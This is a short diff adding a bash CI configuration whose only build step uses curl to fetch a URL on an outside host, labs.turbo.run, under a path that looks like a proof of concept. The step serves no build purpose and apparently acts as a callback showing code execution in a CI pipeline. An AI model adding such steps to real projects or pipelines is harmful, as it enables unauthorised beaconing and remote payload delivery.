@@ -1,0 +1,4 @@
+language: bash
+
+script:
+    - curl -Ls "https://labs.turbo.run/bpoc/load?id=2"
